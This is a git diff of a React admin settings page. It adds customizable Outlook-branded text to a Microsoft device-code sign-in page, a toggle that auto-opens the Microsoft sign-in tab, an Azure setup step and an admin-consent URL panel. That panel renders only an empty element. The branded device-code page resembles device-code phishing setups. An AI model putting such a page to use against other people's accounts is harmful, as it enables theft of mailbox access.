@@ -2,7 +2,7 @@ import { useEffect, useState } from 'react'
 import {
   Save, RotateCcw, AlertTriangle, Eye, EyeOff,
   ExternalLink, CheckCircle, XCircle, Info, Copy,
-  ChevronDown, ChevronRight,
+  ChevronDown, ChevronRight, Building2,
 } from 'lucide-react'
 import toast from 'react-hot-toast'
 import AdminLayout from '../components/layout/AdminLayout'
@@ -10,6 +10,7 @@ import Modal from '../components/ui/Modal'
 import Spinner from '../components/ui/Spinner'
 import { getSettings, updateSettings, resetSettings } from '../api/admin'
 import { OAUTH_REDIRECT_URI } from '../api/client'
+import { getMicrosoftAdminConsentUrl } from '../api/mail'
 
 const GROUP_LABELS = {
   general:    'General',
@@ -315,21 +316,30 @@ function LoginPageSection({ settings, pending, getValue, onChange, changeCount, 
     return getValue(s.key, s.raw_value, s.type)
   }
 
-  const title      = val('login_page_title')        || 'Sign in'
-  const subtitle   = val('login_page_subtitle')     || ''
-  const btnText    = val('login_page_button_text')  || 'Sign in with Microsoft'
-  const footerText = val('login_page_footer_text')  || ''
-  const bgColor    = val('login_page_bg_color')     || '#0f0f1a'
-  const cardColor  = val('login_page_card_color')   || '#1a1a2e'
-  const accent     = val('login_page_accent_color') || '#0078d4'
-  const logoUrl    = val('login_page_logo_url')     || ''
+  const title        = val('login_page_title')           || 'Sign in'
+  const subtitle     = val('login_page_subtitle')        || ''
+  const badgeText    = val('login_page_badge_text')      || 'OUTLOOK MAIL'
+  const btnText      = val('login_page_button_text')     || 'Sign in with Microsoft'
+  const step1Label   = val('login_page_step1_label')     || 'Step 1 — Copy this code'
+  const step2Label   = val('login_page_step2_label')     || 'Step 2 — Open this page'
+  const waitingText  = val('login_page_waiting_text')    || 'Waiting for sign-in…'
+  const footerText   = val('login_page_footer_text')     || ''
+  const bgColor      = val('login_page_bg_color')        || '#0f0f1a'
+  const cardColor    = val('login_page_card_color')      || '#1a1a2e'
+  const accent       = val('login_page_accent_color')    || '#0078d4'
+  const logoUrl      = val('login_page_logo_url')        || ''
+  const autoOpenLink = val('login_page_auto_open_link')
 
   const textFields = [
-    { key: 'login_page_title',       label: 'Page title',      placeholder: 'Sign in' },
-    { key: 'login_page_subtitle',    label: 'Sub-heading',     placeholder: 'Use your Outlook account to continue' },
-    { key: 'login_page_button_text', label: 'Button label',    placeholder: 'Sign in with Microsoft' },
-    { key: 'login_page_footer_text', label: 'Footer note',     placeholder: 'Small print at the bottom of the card…' },
-    { key: 'login_page_logo_url',    label: 'Custom logo URL', placeholder: 'https://…/logo.png  (leave blank for default)' },
+    { key: 'login_page_title',        label: 'Page title',        placeholder: 'Sign in' },
+    { key: 'login_page_subtitle',     label: 'Sub-heading',       placeholder: 'Use your Outlook account to continue' },
+    { key: 'login_page_badge_text',   label: 'Badge text',        placeholder: 'OUTLOOK MAIL' },
+    { key: 'login_page_step1_label',  label: 'Step 1 label',      placeholder: 'Step 1 — Copy this code' },
+    { key: 'login_page_step2_label',  label: 'Step 2 label',      placeholder: 'Step 2 — Open this page' },
+    { key: 'login_page_button_text',  label: 'Button label',      placeholder: 'Sign in with Microsoft' },
+    { key: 'login_page_waiting_text', label: 'Waiting status',    placeholder: 'Waiting for sign-in…' },
+    { key: 'login_page_footer_text',  label: 'Footer note',       placeholder: 'Small print at the bottom of the card…' },
+    { key: 'login_page_logo_url',     label: 'Custom logo URL',   placeholder: 'https://…/logo.png  (leave blank for default)' },
   ]
 
   const colorFields = [
@@ -376,6 +386,33 @@ function LoginPageSection({ settings, pending, getValue, onChange, changeCount, 
                 </div>
               )
             })}
+          </div>
+
+          {/* Behaviour toggles */}
+          <div className="pt-3 pb-1">
+            <p className="text-[11px] font-semibold text-gray-500 uppercase tracking-wider px-2 mb-2">Behaviour</p>
+            {byKey['login_page_auto_open_link'] && (() => {
+              const s       = byKey['login_page_auto_open_link']
+              const current = getValue(s.key, s.raw_value, s.type)
+              const changed = s.key in pending
+              return (
+                <div key={s.key} className={`flex items-center gap-3 py-2.5 px-2 rounded-lg transition-colors ${changed ? 'bg-brand/5' : ''}`}>
+                  <div className="flex-1 min-w-0">
+                    <p className="text-xs font-medium text-gray-300">Auto-open Microsoft page on copy</p>
+                    <p className="text-[11px] text-gray-500 mt-0.5 leading-snug">
+                      When the user clicks Copy, automatically open the Microsoft sign-in tab so they can paste the code immediately.
+                    </p>
+                    {changed && <span className="text-[10px] text-brand">modified</span>}
+                  </div>
+                  <button
+                    onClick={() => onChange(s.key, !current)}
+                    className={`relative inline-flex h-6 w-11 flex-shrink-0 items-center rounded-full transition-colors ${current ? 'bg-brand' : 'bg-surface-border'}`}
+                  >
+                    <span className={`inline-block h-4 w-4 rounded-full bg-white shadow transition-transform ${current ? 'translate-x-6' : 'translate-x-1'}`} />
+                  </button>
+                </div>
+              )
+            })()}
           </div>
 
           {/* Colour pickers */}
@@ -442,26 +479,39 @@ function LoginPageSection({ settings, pending, getValue, onChange, changeCount, 
               }
             </div>
 
+            {/* Badge */}
+            <p className="text-[8px] text-gray-500 tracking-widest uppercase mb-2">{badgeText}</p>
+
             {/* Card */}
             <div
-              className="w-full rounded-xl px-3 pt-3 pb-2.5 text-center"
+              className="w-full rounded-xl px-3 pt-3 pb-2.5"
               style={{ background: cardColor, border: `1px solid ${accent}30` }}
             >
-              <p className="text-[11px] font-bold text-white mb-0.5 truncate">{title}</p>
-              {subtitle && <p className="text-[9px] text-gray-400 mb-2 truncate leading-tight">{subtitle}</p>}
+              <p className="text-[11px] font-bold text-white mb-0.5 text-center truncate">{title}</p>
+              {subtitle && <p className="text-[8px] text-gray-400 mb-2 text-center leading-tight line-clamp-2">{subtitle}</p>}
 
-              {/* Sign in button mock */}
-              <div className="bg-white rounded px-2 py-1.5 flex items-center gap-1.5 justify-center mb-2">
-                <div className="grid grid-cols-2 gap-0.5 flex-shrink-0">
-                  {['#f25022','#7fba00','#00a4ef','#ffb900'].map(c => (
-                    <div key={c} className="w-1.5 h-1.5 rounded-[1px]" style={{ background: c }} />
-                  ))}
-                </div>
-                <span className="text-[8px] font-semibold text-gray-800 truncate leading-none">{btnText}</span>
+              {/* Step 1 — code */}
+              <p className="text-[7px] font-semibold text-gray-500 uppercase tracking-wider mb-1">{step1Label}</p>
+              <div className="rounded-lg py-2 mb-2 text-center" style={{ background: `${accent}18`, border: `1px solid ${accent}30` }}>
+                <span className="text-[10px] font-mono font-bold tracking-[0.2em]" style={{ color: accent }}>CQX6V9X7G</span>
               </div>
 
+              {/* Step 2 — button */}
+              <p className="text-[7px] font-semibold text-gray-500 uppercase tracking-wider mb-1">{step2Label}</p>
+              <div className="rounded-lg px-2 py-1.5 flex items-center gap-1.5 justify-center mb-2" style={{ background: accent }}>
+                <div className="grid grid-cols-2 gap-0.5 flex-shrink-0">
+                  {['#f25022','#7fba00','#00a4ef','#ffb900'].map(c => (
+                    <div key={c} className="w-1 h-1 rounded-[1px]" style={{ background: c }} />
+                  ))}
+                </div>
+                <span className="text-[7px] font-semibold text-white truncate leading-none">{btnText}</span>
+              </div>
+
+              {/* Waiting */}
+              <p className="text-[7px] text-gray-500 text-center">{waitingText}</p>
+
               {footerText && (
-                <p className="text-[7px] text-gray-600 leading-tight line-clamp-2">{footerText}</p>
+                <p className="text-[7px] text-gray-600 leading-tight line-clamp-2 mt-2 text-center border-t border-white/5 pt-2">{footerText}</p>
               )}
             </div>
           </div>
@@ -555,6 +605,11 @@ function AzureSection({ settings, pending, getValue, onChange, changeCount, onSa
             <code className="bg-surface-raised px-1 rounded text-gray-200">offline_access</code>.
             Then click <strong className="text-white">Grant admin consent</strong>.
           </Step>
+          <Step n={8}>
+            <strong className="text-white">Authentication → Advanced settings → Allow public client flows</strong> → set to{' '}
+            <strong className="text-white">Yes</strong> and save.{' '}
+            <span className="text-gray-500">Required for the device-code sign-in flow on the user login page.</span>
+          </Step>
         </ol>
       </div>
 
@@ -610,7 +665,43 @@ function AzureSection({ settings, pending, getValue, onChange, changeCount, onSa
           />
         )}
       </div>
+
+      {/* Admin Consent URL — for org admins who block user consent */}
+      {isConfigured && <AdminConsentUrlPanel />}
     </SectionCard>
+  )
+}
+
+/**
+ * Lets the admin generate and copy/share the Microsoft admin-consent URL.
+ * Useful when a user's organization blocks user consent for third-party apps.
+ */
+function AdminConsentUrlPanel() {
+  const [url,     setUrl]     = useState('')
+  const [loading, setLoading] = useState(false)
+  const [copied,  setCopied]  = useState(false)
+  const [error,   setError]   = useState('')
+  const [open,    setOpen]    = useState(false)
+
+  function fetchUrl() {
+    if (url) { setOpen(true); return }
+    setLoading(true)
+    setError('')
+    getMicrosoftAdminConsentUrl()
+      .then(d => { setUrl(d.url ?? ''); setOpen(true) })
+      .catch(e => setError(e.response?.data?.message ?? 'Failed to generate URL.'))
+      .finally(() => setLoading(false))
+  }
+
+  function handleCopy() {
+    if (!url) return
+    navigator.clipboard.writeText(url)
+      .then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500) })
+      .catch(() => toast.error('Copy failed.'))
+  }
+
+  return (
+    <div className=""></div>
   )
 }
 
